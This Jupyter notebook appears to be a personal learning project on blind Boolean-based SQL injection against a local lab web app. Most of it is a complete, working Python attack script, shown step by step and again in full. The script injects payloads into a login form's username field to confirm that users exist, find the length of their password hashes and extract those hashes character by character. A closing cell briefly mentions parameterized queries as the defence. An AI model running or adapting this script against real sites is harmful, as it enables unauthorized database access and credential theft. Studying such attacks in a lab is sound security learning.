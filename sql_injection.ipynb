{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "629603e1-0cab-4e5c-af0a-5005fb26375d",
   "metadata": {},
   "source": [
    "# Blind Boolean-Based SQL Injection to Extract Password Hashes\n",
    "\n",
    "In this project, I developed a simple Python script to demonstrate a blind Boolean-based SQL injection attack. The script targets a vulnerable web application running locally (http://127.0.0.1:5000) and attempts to extract the password hash of a user by exploiting SQL injection vulnerabilities in the `username` parameter.\n",
    "\n",
    "The approach follows a structured attack:\n",
    "1. **Check if a user exists**.\n",
    "2. **Find the password length**.\n",
    "3. **Extract the password hash character by character**."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf8459b7-3631-40d1-a7ce-822a8104ce89",
   "metadata": {},
   "source": [
    "## Step 1: Imports and Setup\n",
    "\n",
    "First, I needed to import the necessary libraries and define some important variables:\n",
    "- `requests`: To send HTTP requests to the vulnerable server.\n",
    "- `total_queries`: A global counter to track the number of queries sent.\n",
    "- `charset`: The set of characters (hexadecimal digits in this case) to guess the password hash.\n",
    "- `target`: The URL of the vulnerable web application.\n",
    "- `needle`: The string `\"Welcome back\"`, which is the success indicator in the server's response."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "87ee185a-284b-470c-a389-ddd066a2969f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "total_queries = 0\n",
    "charset = \"0123456789abcdef\"\n",
    "target = \"http://127.0.0.1:5000\"\n",
    "needle = \"Welcome back\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d146e113-f302-4b05-a948-8ad35bcc0233",
   "metadata": {},
   "source": [
    "## Step 2: The Injection Mechanism - injected_query\n",
    "The core of the attack is the injected_query function, which sends a crafted SQL query to the server. The query modifies the username parameter, injecting a payload to check the result of a SQL condition.\n",
    "\n",
    "The payload is designed to test whether a specific condition is true or false. If the condition is true, the server responds with \"Welcome back\"; otherwise, the response differs. The function checks for the presence of \"Welcome back\" in the response to infer if the injected condition was true or false."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "406753fd-7af1-4886-9b2a-9a77d37b0451",
   "metadata": {},
   "outputs": [],
   "source": [
    "def injected_query(payload):\n",
    "    global total_queries\n",
    "    r = requests.post(\n",
    "        target, \n",
    "        data = {\"username\" : \"admin' and {}\".format(payload), \"password\" : \"password\"}\n",
    "    )\n",
    "    total_queries += 1\n",
    "    return needle.encode() not in r.content\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1f54e9fb-da5a-4b73-bf41-4c33c79dbbe6",
   "metadata": {},
   "source": [
    "## Step 3: Testing User Validity - invalid_user\n",
    "The first step in the attack is to check whether a given user exists. This is done by injecting a condition that checks if the user_id exists in the database. The query checks if (select id from user where id = {user_id}) >= 0 is true, which will only succeed if the user exists."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "546e3edc-7289-41a9-9199-4d7d5e689aa1",
   "metadata": {},
   "outputs": [],
   "source": [
    "def invalid_user(user_id):\n",
    "    payload = f\"(select id from user where id = {user_id}) >= 0\"\n",
    "    return injected_query(payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3302599c-da0c-431d-ac30-10eff2a8d873",
   "metadata": {},
   "source": [
    "## Step 4: Finding Password Length - password_length\n",
    "Once I know that the user exists, the next step is to determine the length of their password hash. The script increments a counter i until it finds the actual password length. The condition (length(password) <= {i}) is used to test whether the password length is less than or equal to i."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "d0da4868-48e6-437e-813d-87aeee8977b4",
   "metadata": {},
   "outputs": [],
   "source": [
    "def password_length(user_id):\n",
    "    i = 0\n",
    "    while True:\n",
    "        payload = f\"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)\"\n",
    "        if not injected_query(payload):\n",
    "            return i\n",
    "        i += 1\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "12da8652-d26c-4d01-9eac-da57aaeb6d58",
   "metadata": {},
   "source": [
    "## Step 5: Extracting the Password Hash - extract_hash\n",
    "Once the password length is known, the script extracts each character of the password hash one by one. It does this by iterating through each character position, using a boolean_query to check whether the character at each position matches any of the possible characters in the charset.\n",
    "\n",
    "For each character position, the query compares the character against a set of possible characters (hex digits from 0 to f). The query checks the condition (select hex(substr(password, {offset +1}, 1)) from user where id= {user_id}) {operator} hex('{character}'), adjusting the offset and character to gradually build the password hash."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "d46807ab-9d54-437a-9654-3426752b741d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def extract_hash(charset, user_id, password_length):\n",
    "    found = \"\"\n",
    "    for i in range(0, password_length):\n",
    "        for j in range(len(charset)):\n",
    "            if boolean_query(i, user_id, charset[j]):\n",
    "                found += charset[j]\n",
    "                break\n",
    "    return found\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c960d787-5205-45b8-9368-c3d5e62c7a54",
   "metadata": {},
   "source": [
    "## Step 6: The Boolean Query - boolean_query\n",
    "The boolean_query function tests whether a guessed character at position i matches the actual character in the password hash. It sends the crafted SQL payload and checks whether the server response indicates that the condition is true (i.e., the guessed character is correct)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "3a071774-7807-4a1f-be60-233ff7be704a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def boolean_query(offset, user_id, character, operator=\">\"):\n",
    "    print(f\"offset: {offset}, user_id: {user_id}, operator: {operator}\")\n",
    "    payload = f\"(select hex(substr(password, {offset +1}, 1)) from user where id= {user_id}) {operator} hex('{character}')\"\n",
    "    return injected_query(payload)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dbbbf497-7c6b-4170-8ee5-752ed88e583f",
   "metadata": {},
   "source": [
    "## Step 7: Running the Attack\n",
    "The main part of the script continuously prompts for a user_id and attempts to extract the password hash. If the user exists, the script will first calculate the password length and then extract the password hash character by character."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6df312f-2853-4b48-a9fa-a9494d6e0ef8",
   "metadata": {},
   "outputs": [],
   "source": [
    "while True:\n",
    "    try:\n",
    "        user_id = input(\"> Enter a user ID to extract the password hash: \")\n",
    "        if not invalid_user(user_id):\n",
    "            user_password_length = password_length(user_id)\n",
    "            print(f\"\\t[-] User {user_id} hash length: {user_password_length}\")\n",
    "            print(f\"\\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}\")\n",
    "        else:\n",
    "            print(f\"\\t [X] User {user_id} does not exist.\")\n",
    "    except KeyboardInterrupt:\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "268855cd-22b5-434a-b300-bff7abad360d",
   "metadata": {},
   "source": [
    "## Lessons Learned\n",
    "\n",
    "Blind Boolean-Based SQL Injection: While slower than error-based or union-based SQL injection methods, blind Boolean-based SQL injection can still be highly effective for exfiltrating sensitive information like password hashes.\n",
    "\n",
    "Structured Approach: The script uses a structured approach: first, checking if the user exists, then calculating the password length, and finally extracting the password hash character by character. This is a well-organized method for handling blind SQL injection.\n",
    "\n",
    "Real-World Defenses: This project highlights why using prepared statements, parameterized queries, and input validation is critical to preventing such SQL injection attacks. Implementing proper logging and monitoring can also help detect and block these types of attacks.\n",
    "\n",
    "This project provided a hands-on way to learn about SQL injection, specifically blind Boolean-based attacks. By testing various conditions to infer information, I was able to extract a password hash from a vulnerable web application. This exercise reinforced the importance of secure coding practices to prevent SQL injection vulnerabilities."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "363cad60-6497-41d4-904c-3a9317391a1e",
   "metadata": {},
   "source": [
    "# Full Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "46de2263-35df-4526-bc2f-90d7b728e861",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "total_queries = 0\n",
    "charset = \"0123456789abcdef\"\n",
    "target = \"http://127.0.0.1:5000\"\n",
    "needle = \"Welcome back\"\n",
    "\n",
    "def injected_query(payload):\n",
    "    global total_queries\n",
    "    r = requests.post(\n",
    "        target, \n",
    "        data = {\"username\" : \"admin' and {}\".format(payload), \"password\" : \"password\"}\n",
    "    )\n",
    "    total_queries += 1\n",
    "    return needle.encode() not in r.content\n",
    "\n",
    "def boolean_query(offset, user_id, character, operator=\">\"):\n",
    "    print(f\"offset: {offset}, user_id: {user_id}, operator: {operator}\")\n",
    "    payload = f\"(select hex(substr(password, {offset +1}, 1)) from user where id= {user_id}) {operator} hex('{character}')\"\n",
    "    return injected_query(payload)\n",
    "\n",
    "def invalid_user(user_id):\n",
    "    payload = f\"(select id from user where id = {user_id}) >= 0\"\n",
    "    return injected_query(payload)\n",
    "\n",
    "def password_length(user_id):\n",
    "    i = 0\n",
    "    while True:\n",
    "        payload = f\"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)\"\n",
    "        if not injected_query(payload):\n",
    "            return i\n",
    "        i += 1\n",
    "\n",
    "def extract_hash(charset, user_id, password_length):\n",
    "    found = \"\"\n",
    "    for i in range(0, password_length):\n",
    "        for j in range(len(charset)):\n",
    "            if boolean_query(i, user_id, charset[j]):\n",
    "                found += charset[j]\n",
    "                break\n",
    "    return found\n",
    "\n",
    "while True:\n",
    "    try:\n",
    "        user_id = input(\"> Enter a user ID to extract the password hash: \")\n",
    "        if not invalid_user(user_id):\n",
    "            user_password_length = password_length(user_id)\n",
    "            print(f\"\\t[-] User {user_id} hash length: {user_password_length}\")\n",
    "            print(f\"\\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}\")\n",
    "        else:\n",
    "            print(f\"\\t [X] User {user_id} does not exist.\")\n",
    "    except KeyboardInterrupt:\n",
    "        break\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
